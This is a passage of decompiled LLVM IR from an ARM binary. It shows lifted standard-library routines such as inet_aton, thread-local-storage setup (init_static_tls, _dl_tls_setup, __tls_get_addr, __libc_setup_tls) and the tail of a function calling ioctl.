  %v0_17390 = load i32, i32* %r0.global-to-local, align 4
  %v1_17390 = load i32, i32* @r4, align 4
  %v2_17390 = add i32 %v1_17390, 12
  %v3_17390 = inttoptr i32 %v2_17390 to i32*
  store i32 %v0_17390, i32* %v3_17390, align 4
  %v2_17394 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17394, i32* @r1, align 4
  %v1_1739c = load i32, i32* @r4, align 4
  %v2_1739c = inttoptr i32 %v1_1739c to i32*
  store i32 %v3_17384, i32* %v2_1739c, align 4
  %v0_173a0 = load i32, i32* @ip, align 4
  %v1_173a0 = trunc i32 %v0_173a0 to i8
  %v2_173a0 = load i32, i32* @r4, align 4
  %v3_173a0 = add i32 %v2_173a0, 16
  %v4_173a0 = inttoptr i32 %v3_173a0 to i8*
  store i8 %v1_173a0, i8* %v4_173a0, align 1
  %v0_173a4 = load i32, i32* @r4, align 4
  %v1_173a4 = add i32 %v0_173a4, 17
  store i32 %v1_173a4, i32* %r0.global-to-local, align 4
  %v4_173a8 = call i32 @__GI_mempcpy(i32 %v1_173a4, i32 %v2_17394, i32 19, i32 %v3_17384)
  store i32 %v4_173a8, i32* %r0.global-to-local, align 4
  %v0_173ac = load i32, i32* @r5, align 4
  store i32 %v0_173ac, i32* %r1.global-to-local, align 4
  %v3_173b4 = inttoptr i32 %v4_173a8 to i8*
  %v4_173b4 = call i32 @__GI_memset(i8* %v3_173b4, i32 %v0_173ac, i32 13)
  store i32 %v4_173b4, i32* %r0.global-to-local, align 4
  %v0_173b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %entry, %dec_label_pc_17374
  %v0_173b8 = phi i32 [ %v3_17368, %entry ], [ %v0_173b8.pre, %dec_label_pc_17374 ]
  store i32 %v0_173b8, i32* %r0.global-to-local, align 4
  store i32 %v3_17350, i32* @r4, align 4
  store i32 %v6_17350, i32* @r5, align 4
  store i32 %v9_17350, i32* @r6, align 4
  ret i32 %v0_173b8

; uselistorder directives
  uselistorder i32 %v0_173b8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 17, 18, 5, 19, 6, 7, 8, 9, 10, 11, 20, 12, 21, 13, 22, 23, 14, 24, 15, 2, 25, 3, 26, 27, 28, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_173b8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_173cc = load i32, i32* @r4, align 4
  store i32 %v3_173cc, i32* %stack_var_-28, align 4
  %v0_173d4 = load i32, i32* @r0, align 4
  %v2_173d4 = icmp eq i32 %v0_173d4, 0
  %v0_173dc = load i32, i32* @r1, align 4
  br i1 %v2_173d4, label %dec_label_pc_174b0, label %dec_label_pc_173e4

dec_label_pc_173e4:                               ; preds = %entry
  br label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173e4, %dec_label_pc_17474
  %v1_17474 = phi i32 [ 0, %dec_label_pc_173e4 ], [ %v5_17474, %dec_label_pc_17474 ]
  %v0_17478 = phi i32 [ 1, %dec_label_pc_173e4 ], [ %v1_17478, %dec_label_pc_17474 ]
  %v0_173fc = phi i32 [ %v0_173d4, %dec_label_pc_173e4 ], [ %v0_173fc14, %dec_label_pc_17474 ]
  %v1_173fc = inttoptr i32 %v0_173fc to i8*
  %v2_173fc = load i8, i8* %v1_173fc, align 1
  %v3_173fc = zext i8 %v2_173fc to i32
  %v4_17400 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 276) to i32*), align 4
  %v2_17404 = mul nuw nsw i32 %v3_173fc, 2
  %v2_17408 = add i32 %v2_17404, %v4_17400
  %v3_17408 = inttoptr i32 %v2_17408 to i16*
  %v4_17408 = load i16, i16* %v3_17408, align 2
  %v1_1740c = and i16 %v4_17408, 8
  %v2_1740c = icmp eq i16 %v1_1740c, 0
  br i1 %v2_1740c, label %dec_label_pc_174b0, label %dec_label_pc_17414

dec_label_pc_17414:                               ; preds = %dec_label_pc_173fc
  br label %dec_label_pc_17434

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17434
  %v2_1741c = mul i32 %v0_17474, 10
  %v1_17420 = add i32 %v2_1741c, -48
  %v2_17424 = add i32 %v3_17434, %v1_17420
  %v8_1742c = icmp sgt i32 %v2_17424, 255
  br i1 %v8_1742c, label %dec_label_pc_174b0, label %dec_label_pc_17430

dec_label_pc_17430:                               ; preds = %dec_label_pc_1741c
  %v1_17430 = add i32 %v0_17464, 1
  store i32 %v1_17430, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_17414, %dec_label_pc_17430
  %v0_17474 = phi i32 [ 0, %dec_label_pc_17414 ], [ %v2_17424, %dec_label_pc_17430 ]
  %v0_17464 = phi i32 [ %v0_173fc, %dec_label_pc_17414 ], [ %v1_17430, %dec_label_pc_17430 ]
  %v1_17434 = inttoptr i32 %v0_17464 to i8*
  %v2_17434 = load i8, i8* %v1_17434, align 1
  %v3_17434 = zext i8 %v2_17434 to i32
  %v2_17438 = mul nuw nsw i32 %v3_17434, 2
  %v2_1743c = add i32 %v2_17438, %v4_17400
  %v3_1743c = inttoptr i32 %v2_1743c to i16*
  %v4_1743c = load i16, i16* %v3_1743c, align 2
  %v6_1743c = zext i16 %v4_1743c to i32
  %v1_17440 = and i32 %v6_1743c, 8
  %v2_17440 = icmp eq i32 %v1_17440, 0
  br i1 %v2_17440, label %dec_label_pc_17448, label %dec_label_pc_1741c

dec_label_pc_17448:                               ; preds = %dec_label_pc_17434
  %v7_17448 = icmp eq i32 %v0_17478, 4
  br i1 %v7_17448, label %dec_label_pc_17460, label %dec_label_pc_17450

dec_label_pc_17450:                               ; preds = %dec_label_pc_17448
  %v7_17450 = icmp eq i8 %v2_17434, 46
  br i1 %v7_17450, label %dec_label_pc_17458, label %dec_label_pc_174b0

dec_label_pc_17458:                               ; preds = %dec_label_pc_17450
  %v1_17458 = add i32 %v0_17464, 1
  store i32 %v1_17458, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17474

dec_label_pc_17460:                               ; preds = %dec_label_pc_17448
  %v2_17460 = icmp eq i8 %v2_17434, 0
  %v1_17464 = add i32 %v0_17464, 1
  store i32 %v1_17464, i32* %r0.global-to-local, align 4
  br i1 %v2_17460, label %dec_label_pc_17474, label %dec_label_pc_1746c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17460
  %v1_1746c = and i32 %v6_1743c, 32
  %v2_1746c = icmp eq i32 %v1_1746c, 0
  br i1 %v2_1746c, label %dec_label_pc_174b0, label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_1746c, %dec_label_pc_17460, %dec_label_pc_17458
  %v0_173fc14 = phi i32 [ %v1_17464, %dec_label_pc_1746c ], [ %v1_17464, %dec_label_pc_17460 ], [ %v1_17458, %dec_label_pc_17458 ]
  %v4_17474 = mul i32 %v1_17474, 256
  %v5_17474 = or i32 %v0_17474, %v4_17474
  %v1_17478 = add nuw nsw i32 %v0_17478, 1
  %v7_17480 = icmp slt i32 %v1_17478, 5
  br i1 %v7_17480, label %dec_label_pc_173fc, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17474
  %v2_17484 = icmp eq i32 %v0_173dc, 0
  br i1 %v2_17484, label %.thread9.thread, label %bb

.thread9.thread:                                  ; preds = %dec_label_pc_17484
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174b4

bb:                                               ; preds = %dec_label_pc_17484
  %v4_17488 = udiv i32 %v5_17474, 16777216
  %v2_1748c = udiv i32 %v5_17474, 256
  %v5_17490 = and i32 %v2_1748c, 65280
  %v2_17494 = and i32 %v5_17474, 65280
  %v5_17498 = mul nuw nsw i32 %v2_17494, 256
  %v5_1749c = mul i32 %v0_17474, 16777216
  %v6_17490 = or i32 %v4_17488, %v5_1749c
  %v6_17498 = or i32 %v6_17490, %v5_17490
  %v6_1749c = or i32 %v6_17498, %v5_17498
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_174a8 = inttoptr i32 %v0_173dc to i32*
  store i32 %v6_1749c, i32* %v3_174a8, align 4
  %v2_174b4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_174b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174b4

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17450, %dec_label_pc_1746c, %dec_label_pc_173fc, %dec_label_pc_1741c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174b4

dec_label_pc_174b4:                               ; preds = %.thread9.thread, %bb, %dec_label_pc_174b0
  %v1_174b8 = phi i32 [ %v1_174b8.pre, %bb ], [ 0, %dec_label_pc_174b0 ], [ 1, %.thread9.thread ]
  %v2_174b4 = phi i32 [ %v2_174b4.pre, %bb ], [ %v3_173cc, %dec_label_pc_174b0 ], [ %v3_173cc, %.thread9.thread ]
  store i32 %v2_174b4, i32* @r4, align 4
  ret i32 %v1_174b8

; uselistorder directives
  uselistorder i32 %v1_17478, { 1, 0 }
  uselistorder i32 %v5_17474, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17464, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 69, 0, 6, 1, 2, 7, 8, 9, 10, 11, 49, 50, 12, 13, 14, 51, 52, 15, 16, 17, 18, 19, 53, 3, 54, 55, 20, 21, 4, 22, 56, 57, 40, 23, 24, 25, 26, 27, 43, 44, 41, 42, 58, 59, 60, 47, 48, 45, 46, 61, 62, 63, 64, 5, 65, 28, 29, 66, 30, 31, 32, 33, 67, 34, 35, 68, 36, 37, 38, 39, 70 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 5, 19, 6, 20, 21, 22 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_174b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174b0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17434, { 1, 0 }
  uselistorder label %dec_label_pc_173fc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_174d0 = load i32, i32* @r4, align 4
  store i32 %v3_174d0, i32* %stack_var_-16, align 4
  %v4_174d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_174dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_174e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 36) to i32*), align 4
  store i32 %v4_174e4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_174ec = inttoptr i32 %v4_174d4 to i32*
  %v2_174ec = load i32, i32* %v1_174ec, align 4
  %v4_174f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 52) to i32*), align 4
  store i32 %v4_174f0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_174f8 = add i32 %v2_174ec, 15
  %v4_174fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 144) to i32*), align 4
  store i32 %v4_174fc, i32* @ip, align 4
  %v1_17500 = load i32, i32* @r0, align 4
  %v2_17500 = add i32 %v1_17500, %v1_174f8
  %v1_17504 = inttoptr i32 %v4_174dc to i32*
  %v2_17504 = load i32, i32* %v1_17504, align 4
  store i32 %v2_17504, i32* %r3.global-to-local, align 4
  %v1_17508 = and i32 %v2_17500, -16
  store i32 %v1_17508, i32* %v1_174ec, align 4
  %v0_17510 = load i32, i32* @r0, align 4
  %v1_17510 = load i32, i32* %r4.global-to-local, align 4
  %v2_17510 = inttoptr i32 %v1_17510 to i32*
  store i32 %v0_17510, i32* %v2_17510, align 4
  %v0_17514 = load i32, i32* @r1, align 4
  %v1_17514 = load i32, i32* %lr.global-to-local, align 4
  %v2_17514 = inttoptr i32 %v1_17514 to i32*
  store i32 %v0_17514, i32* %v2_17514, align 4
  %v0_17518 = load i32, i32* %r3.global-to-local, align 4
  %v1_17518 = load i32, i32* @ip, align 4
  %v2_17518 = inttoptr i32 %v1_17518 to i32*
  store i32 %v0_17518, i32* %v2_17518, align 4
  %v2_1751c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1751c, i32* %r4.global-to-local, align 4
  %v1_17520 = load i32, i32* @r0, align 4
  ret i32 %v1_17520

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17528(i32 %arg1) local_unnamed_addr {
dec_label_pc_17528:
  %v0_17528 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17528, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17528
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17528, %bb
  %v4_17538 = phi i32 [ %arg1, %dec_label_pc_17528 ], [ 0, %bb ]
  ret i32 %v4_17538

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r3.global-to-local, align 4
  %v4_1754c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 84) to i32*), align 4
  store i32 %v4_1754c, i32* @lr, align 4
  %v4_17558 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17578 = inttoptr i32 %v4_17558 to i32*
  store i32 1, i32* %v2_17578, align 4
  %v0_1757c = load i32, i32* %r3.global-to-local, align 4
  %v1_1757c = load i32, i32* @lr, align 4
  %v2_1757c = inttoptr i32 %v1_1757c to i32*
  store i32 %v0_1757c, i32* %v2_1757c, align 4
  %v0_17580 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17598(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17598:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17598 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17598, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17598
  %v2_17598 = load i32, i32* @r4, align 4
  %v8_17598 = ashr i32 %v2_17598, %tmp
  %v9_17598 = and i32 %v8_17598, %tmp
  %v2_1759c = load i32, i32* @ip, align 4
  %v8_1759c = lshr i32 %v2_1759c, %v9_17598
  %v9_1759c = and i32 %v8_1759c, %v9_17598
  store i32 %v9_1759c, i32* %r0.global-to-local, align 4
  %v4_175a0 = inttoptr i32 %v9_1759c to i32*
  store i32 %arg2, i32* %v4_175a0, align 4
  %v5_175a0 = load i32, i32* @ip, align 4
  %v6_175a0 = load i32, i32* %r0.global-to-local, align 4
  %v7_175a0 = sub i32 %v6_175a0, %v5_175a0
  store i32 %v7_175a0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17598, %bb
  %v8_175a0 = phi i32 [ %tmp, %dec_label_pc_17598 ], [ %v7_175a0, %bb ]
  ret i32 %v8_175a0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_175ac = call i32 @__aeabi_read_tp()
  %v1_175b0 = inttoptr i32 %v0_175ac to i32*
  %v2_175b0 = load i32, i32* %v1_175b0, align 4
  %v1_175b4 = add i32 %arg1, 4
  %v2_175b4 = inttoptr i32 %v1_175b4 to i32*
  %v3_175b4 = load i32, i32* %v2_175b4, align 4
  %v1_175b8 = add i32 %v2_175b0, 8
  %v2_175b8 = inttoptr i32 %v1_175b8 to i32*
  %v3_175b8 = load i32, i32* %v2_175b8, align 4
  %v2_175bc = add i32 %v3_175b8, %v3_175b4
  ret i32 %v2_175bc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_175c8 = load i32, i32* @r4, align 4
  store i32 %v3_175c8, i32* %stack_var_-36, align 4
  %v6_175c8 = load i32, i32* @r5, align 4
  %v15_175c8 = load i32, i32* @r8, align 4
  %v18_175c8 = load i32, i32* @sb, align 4
  %v21_175c8 = load i32, i32* @sl, align 4
  %v24_175c8 = load i32, i32* @fp, align 4
  %v27_175c8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %sl.global-to-local, align 4
  %v4_175d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 104) to i32*), align 4
  store i32 %v4_175d8, i32* %r3.global-to-local, align 4
  %v1_175dc = inttoptr i32 %v4_175d8 to i32*
  %v2_175dc = load i32, i32* %v1_175dc, align 4
  store i32 %v2_175dc, i32* %r2.global-to-local, align 4
  %v2_175e0 = icmp eq i32 %v2_175dc, 0
  %v0_175e8 = load i32, i32* %r0.global-to-local, align 4
  %v0_175ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_175ec, i32* %ip.global-to-local, align 4
  br i1 %v2_175e0, label %dec_label_pc_177b4, label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_175f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 156) to i32*), align 4
  store i32 %v4_175f8, i32* @lr, align 4
  store i32 %v2_175dc, i32* %r1.global-to-local, align 4
  %v1_17640 = inttoptr i32 %v4_175f8 to i32*
  %v2_1764061 = load i32, i32* %v1_17640, align 4
  %v4_1764462 = mul i32 %v2_1764061, 32
  %v5_1764463 = add i32 %v4_1764462, %v2_175dc
  store i32 %v5_1764463, i32* %r3.global-to-local, align 4
  %v3_1764865 = icmp ult i32 %v2_175dc, %v5_1764463
  br i1 %v3_1764865, label %dec_label_pc_17604, label %dec_label_pc_177b4.loopexit

dec_label_pc_17604:                               ; preds = %dec_label_pc_175f4, %dec_label_pc_1763c
  %v0_1761c66 = phi i32 [ %v1_1763c, %dec_label_pc_1763c ], [ %v2_175dc, %dec_label_pc_175f4 ]
  %v1_17604 = inttoptr i32 %v0_1761c66 to i32*
  %v2_17604 = load i32, i32* %v1_17604, align 4
  store i32 %v2_17604, i32* %r3.global-to-local, align 4
  %v7_17608 = icmp eq i32 %v2_17604, 7
  br i1 %v7_17608, label %dec_label_pc_17610, label %dec_label_pc_1763c

dec_label_pc_17610:                               ; preds = %dec_label_pc_17604
  %v1_17610 = add i32 %v0_1761c66, 20
  %v2_17610 = inttoptr i32 %v1_17610 to i32*
  %v3_17610 = load i32, i32* %v2_17610, align 4
  store i32 %v3_17610, i32* %r3.global-to-local, align 4
  %v1_17614 = add i32 %v0_1761c66, 28
  %v2_17614 = inttoptr i32 %v1_17614 to i32*
  %v3_17614 = load i32, i32* %v2_17614, align 4
  store i32 %v3_17614, i32* @r6, align 4
  %v1_1761c = add i32 %v0_1761c66, 16
  %v2_1761c = inttoptr i32 %v1_1761c to i32*
  %v3_1761c = load i32, i32* %v2_1761c, align 4
  store i32 %v3_1761c, i32* %r3.global-to-local, align 4
  %v1_17620 = add i32 %v0_1761c66, 8
  %v2_17620 = inttoptr i32 %v1_17620 to i32*
  %v3_17620 = load i32, i32* %v2_17620, align 4
  store i32 %v3_17620, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17614, %v0_175ec
  %v0_175ec.v3_17614 = select i1 %tmp78, i32 %v0_175ec, i32 %v3_17614
  store i32 %v0_175ec.v3_17614, i32* %fp.global-to-local, align 4
  %v2_17658 = icmp eq i32 %v3_17614, 0
  br i1 %v2_17658, label %dec_label_pc_17680, label %bb

dec_label_pc_1763c:                               ; preds = %dec_label_pc_17604
  %v1_1763c = add i32 %v0_1761c66, 32
  store i32 %v1_1763c, i32* %r1.global-to-local, align 4
  %v2_17640 = load i32, i32* %v1_17640, align 4
  %v4_17644 = mul i32 %v2_17640, 32
  %v5_17644 = add i32 %v4_17644, %v2_175dc
  store i32 %v5_17644, i32* %r3.global-to-local, align 4
  %v3_17648 = icmp ult i32 %v1_1763c, %v5_17644
  br i1 %v3_17648, label %dec_label_pc_17604, label %dec_label_pc_17640.dec_label_pc_177b4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17610
  %v2_1765c = add i32 %v3_17614, -1
  br label %dec_label_pc_17684

dec_label_pc_17680:                               ; preds = %dec_label_pc_17610, %dec_label_pc_177b4
  %v0_17694.pre = phi i32 [ %v0_17694.pre.pre, %dec_label_pc_177b4 ], [ ptrtoint (i32* @global_var_219f0.357 to i32), %dec_label_pc_17610 ]
  %v1_17684.pre = phi i32 [ %v1_17684.pre.pre, %dec_label_pc_177b4 ], [ %v0_175e8, %dec_label_pc_17610 ]
  %v1_176a825 = phi i32 [ %v0_177bc, %dec_label_pc_177b4 ], [ %v0_175ec.v3_17614, %dec_label_pc_17610 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_177b4 ], [ %v3_17610, %dec_label_pc_17610 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_177b4 ], [ %v3_1761c, %dec_label_pc_17610 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_177b4 ], [ %v3_17620, %dec_label_pc_17610 ]
  br label %dec_label_pc_17684

dec_label_pc_17684:                               ; preds = %bb, %dec_label_pc_17680
  %storemerge80 = phi i32 [ %v2_1765c, %bb ], [ 0, %dec_label_pc_17680 ]
  %v0_17684 = phi i32 [ %v2_1765c, %bb ], [ 0, %dec_label_pc_17680 ]
  %storemerge = phi i32 [ %v3_17614, %bb ], [ 1, %dec_label_pc_17680 ]
  %storemerge79 = phi i32 [ %v3_17614, %bb ], [ 1, %dec_label_pc_17680 ]
  %v0_17694 = phi i32 [ ptrtoint (i32* @global_var_219f0.357 to i32), %bb ], [ %v0_17694.pre, %dec_label_pc_17680 ]
  %v1_17684 = phi i32 [ %v0_175e8, %bb ], [ %v1_17684.pre, %dec_label_pc_17680 ]
  %v1_176a8 = phi i32 [ %v0_175ec.v3_17614, %bb ], [ %v1_176a825, %dec_label_pc_17680 ]
  %stack_var_-52.3 = phi i32 [ %v3_17610, %bb ], [ %stack_var_-52.0, %dec_label_pc_17680 ]
  %stack_var_-48.3 = phi i32 [ %v3_1761c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17680 ]
  %stack_var_-44.3 = phi i32 [ %v3_17620, %bb ], [ %stack_var_-44.0, %dec_label_pc_17680 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17684 = add i32 %v1_17684, %v0_17684
  %v2_17688 = udiv i32 %v2_17684, %storemerge
  store i32 %v2_17688, i32* %r0.global-to-local, align 4
  %v2_1768c = mul i32 %v2_17688, %storemerge
  store i32 %v2_1768c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17694 = add i32 %v0_17694, 72
  %v3_17694 = inttoptr i32 %v2_17694 to i32*
  %v4_17694 = load i32, i32* %v3_17694, align 4
  store i32 %v4_17694, i32* %r3.global-to-local, align 4
  %v1_17698 = inttoptr i32 %v4_17694 to i32*
  %v2_17698 = load i32, i32* %v1_17698, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_176a0 = add i32 %v1_176a8, 1168
  %v2_176a4 = add i32 %v1_176a0, %stack_var_-52.3
  %v2_176a8 = add i32 %v2_176a4, %v2_1768c
  %v2_176ac = add i32 %v2_176a8, %v2_17698
  store i32 %v2_176ac, i32* %r0.global-to-local, align 4
  %v1_176b0 = call i32 @__GI_sbrk(i32 %v2_176ac)
  %v1_176b4 = load i32, i32* %fp.global-to-local, align 4
  %v1_176bc = sub i32 0, %v1_176b4
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_176b4 = add i32 %v1_176b0, 1167
  %v1_176c4 = add i32 %v2_176b4, %v1_176b4
  %v2_176c8 = and i32 %v1_176c4, %v1_176bc
  store i32 %v2_176c8, i32* @r5, align 4
  %v1_176d0 = load i32, i32* %sl.global-to-local, align 4
  %v3_176d0 = add i32 %v1_176d0, 10236
  %v4_176d0 = inttoptr i32 %v3_176d0 to i32*
  store i32 62, i32* %v4_176d0, align 4
  %v0_176d8 = load i32, i32* @r5, align 4
  %v1_176d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_176d8 = add i32 %v1_176d8, %v0_176d8
  store i32 %v2_176d8, i32* @ip, align 4
  %v0_176dc = load i32, i32* %sl.global-to-local, align 4
  %v1_176dc = load i32, i32* %r4.global-to-local, align 4
  %v2_176dc = add i32 %v1_176dc, %v0_176dc
  store i32 %v2_176dc, i32* %r4.global-to-local, align 4
  %v2_176e0 = add i32 %v0_176dc, 11524
  store i32 %v2_176e0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_176d8, i32* @r0, align 4
  %v2_176f4 = add i32 %v2_176dc, 16
  %v3_176f4 = inttoptr i32 %v2_176f4 to i32*
  store i32 %v2_176d8, i32* %v3_176f4, align 4
  %v0_176f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_176f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_176f8 = add i32 %v1_176f8, 40
  %v3_176f8 = inttoptr i32 %v2_176f8 to i32*
  store i32 %v0_176f8, i32* %v3_176f8, align 4
  %v0_176fc = load i32, i32* @r3, align 4
  %v1_176fc = trunc i32 %v0_176fc to i8
  %v2_176fc = load i32, i32* %r4.global-to-local, align 4
  %v3_176fc = add i32 %v2_176fc, 20
  %v4_176fc = inttoptr i32 %v3_176fc to i8*
  store i8 %v1_176fc, i8* %v4_176fc, align 1
  %v0_17700 = load i32, i32* %r4.global-to-local, align 4
  %v1_17700 = add i32 %v0_17700, 8
  store i32 %v1_17700, i32* @r4, align 4
  %v0_17704 = call i32 @memcpy()
  %v0_1770c = load i32, i32* @r4, align 4
  %v1_1770c = load i32, i32* @r5, align 4
  %v2_1770c = inttoptr i32 %v1_1770c to i32*
  store i32 %v0_1770c, i32* %v2_1770c, align 4
  %v0_17710 = load i32, i32* @r5, align 4
  store i32 %v0_17710, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17710, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13008.545 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17724 = load i32, i32* %sl.global-to-local, align 4
  %v2_17724 = add i32 %v0_17724, 84
  %v3_17724 = inttoptr i32 %v2_17724 to i32*
  %v4_17724 = load i32, i32* %v3_17724, align 4
  store i32 %v4_17724, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17730 = add i32 %v0_17724, 60
  %v3_17730 = inttoptr i32 %v2_17730 to i32*
  %v4_17730 = load i32, i32* %v3_17730, align 4
  store i32 %v4_17730, i32* %r0.global-to-local, align 4
  %v3_17738 = add i32 %v0_17724, 10748
  %v4_17738 = inttoptr i32 %v3_17738 to i32*
  store i32 64, i32* %v4_17738, align 4
  %v1_17740 = load i32, i32* %r8.global-to-local, align 4
  %v2_17740 = add i32 %v1_17740, 20
  %v3_17740 = inttoptr i32 %v2_17740 to i32*
